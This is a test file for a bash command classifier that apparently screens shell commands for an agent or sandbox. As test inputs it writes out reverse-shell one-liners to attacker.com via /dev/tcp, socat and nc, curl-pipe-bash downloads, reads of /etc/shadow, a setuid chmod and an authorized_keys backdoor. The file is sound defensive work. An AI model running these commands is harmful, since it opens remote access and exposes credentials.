import { describe, expect, test } from "bun:test";
import {
  COMMAND_BYPASS_CASES,
  EXFILTRATION_BYPASS_CASES,
  SAFE_CASES,
} from "./__tests__/bypass-cases.js";
import { classifyCommand } from "./bash-classifier.js";

describe("classifyCommand", () => {
  describe("blocks reverse shells", () => {
    test("/dev/tcp reverse shell", () => {
      const result = classifyCommand("bash -i >& /dev/tcp/attacker.com/4444 0>&1");
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.category).toBe("reverse-shell");
        expect(result.reason).toMatch(/\/dev\/tcp/);
      }
    });

    test("/dev/udp reverse shell", () => {
      const result = classifyCommand("bash -i >& /dev/udp/attacker.com/4444 0>&1");
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.category).toBe("reverse-shell");
    });

    test("socat reverse shell", () => {
      const result = classifyCommand(
        "socat exec:bash,pty,stderr,setsid,sigint,sane tcp:attacker:4444",
      );
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.category).toBe("reverse-shell");
    });

    test("ncat reverse shell", () => {
      expect(classifyCommand("ncat -e /bin/bash attacker 4444").ok).toBe(false);
    });

    test("nc -e reverse shell", () => {
      expect(classifyCommand("nc -e /bin/bash attacker 4444").ok).toBe(false);
    });

    test("curl-pipe-bash", () => {
      const result = classifyCommand("curl http://attacker.com/shell.sh | bash");
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.category).toBe("reverse-shell");
    });

    test("wget-pipe-sh", () => {
      expect(classifyCommand("wget http://attacker.com/shell.sh | sh").ok).toBe(false);
    });
  });

  describe("blocks privilege escalation", () => {
    test("sudo command", () => {
      const result = classifyCommand("sudo cat /etc/shadow");
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.category).toBe("privilege-escalation");
    });

    test("su to user", () => {
      expect(classifyCommand("su root").ok).toBe(false);
    });

    test("chmod setuid", () => {
      expect(classifyCommand("chmod +s /bin/bash").ok).toBe(false);
    });

    test("read /etc/passwd", () => {
      expect(classifyCommand("cat /etc/passwd").ok).toBe(false);
    });

    test("read /etc/shadow", () => {
      expect(classifyCommand("cat /etc/shadow").ok).toBe(false);
    });
  });

  describe("blocks persistence mechanisms", () => {
    test("crontab -e edit", () => {
      expect(classifyCommand("crontab -e").ok).toBe(false);
    });

    test("crontab -l list", () => {
      expect(classifyCommand("crontab -l").ok).toBe(false);
    });

    test("authorized_keys modification", () => {
      expect(classifyCommand("echo 'ssh-rsa ...' >> ~/.ssh/authorized_keys").ok).toBe(false);
    });

    test("/etc/cron.d access", () => {
      expect(classifyCommand("ls /etc/cron.d").ok).toBe(false);
    });

    test("systemctl enable", () => {
      expect(classifyCommand("systemctl enable evil.service").ok).toBe(false);
    });
  });

  describe("blocks reconnaissance", () => {
    test("whoami", () => {
      const result = classifyCommand("whoami");
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.category).toBe("recon");
    });

    test("uname -a", () => {
      expect(classifyCommand("uname -a").ok).toBe(false);
    });

    test("/etc/os-release", () => {
      expect(classifyCommand("cat /etc/os-release").ok).toBe(false);
    });

    test("netstat", () => {
      expect(classifyCommand("netstat -tulnp").ok).toBe(false);
    });
  });

  describe("allows safe commands", () => {
    for (const { input, description } of SAFE_CASES) {
      test(description, () => {
        expect(classifyCommand(input).ok).toBe(true);
      });
    }
  });

  describe("does not false-positive on similar-looking safe commands", () => {
    test("su in substring (subcommand)", () => {
      // "su" followed by a space is blocked, but "suse" or "subscription" should not be
      // Our pattern is /\bsu\s/ — matches "su " but not "subscription"
      expect(classifyCommand("subscription list").ok).toBe(true);
    });

    test("echo with whoami as string", () => {
      // echo 'whoami' prints the literal string — it's blocked because the classifier
      // sees 'whoami' in the command. This is intentional conservatism.
      // Operators who need to echo recon strings should use an explicit allowlist.
      const result = classifyCommand("echo 'whoami'");
      expect(result.ok).toBe(false); // conservative: blocks mention of whoami
    });

    test("curl downloading a file (no pipe to shell)", () => {
      // curl to a URL without piping to shell is NOT blocked
      expect(classifyCommand("curl -o /tmp/file.txt https://example.com/file.txt").ok).toBe(true);
    });

    test("nc used without listen/execute flags", () => {
      // "nc" alone or with simple port args (no -e/-l/-p) should not be blocked
      // Our pattern /\bncat?\b|\bnc\b\s+.*-[elp]/ requires -e, -l, or -p
      expect(classifyCommand("nc localhost 8080").ok).toBe(true);
    });
  });

  describe("bypass case coverage", () => {
    const commandCases = COMMAND_BYPASS_CASES.filter((c) => c.classifier === "command");
    for (const { input, shouldBlock, description } of commandCases) {
      test(`${shouldBlock ? "blocks" : "allows"}: ${description}`, () => {
        expect(classifyCommand(input).ok).toBe(!shouldBlock);
      });
    }
  });

  describe("blocks data exfiltration", () => {
    for (const { input, shouldBlock, description } of EXFILTRATION_BYPASS_CASES) {
      test(`${shouldBlock ? "blocks" : "allows"}: ${description}`, () => {
        expect(classifyCommand(input).ok).toBe(!shouldBlock);
      });
    }
  });

  describe("allows safe curl/wget (no exfil flags)", () => {
    test("curl GET without post/upload flags", () => {
      expect(classifyCommand("curl -o /tmp/file.txt https://example.com/file.txt").ok).toBe(true);
    });

    test("wget GET without post flags", () => {
      expect(classifyCommand("wget -O /tmp/page.html https://example.com").ok).toBe(true);
    });
  });

  describe("ClassificationResult shape", () => {
    test("blocked result has all required fields", () => {
      const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(typeof result.reason).toBe("string");
        expect(result.reason.length).toBeGreaterThan(0);
        expect(typeof result.pattern).toBe("string");
        expect(result.pattern.length).toBeGreaterThan(0);
        expect(result.category).toBeDefined();
      }
    });
  });
});
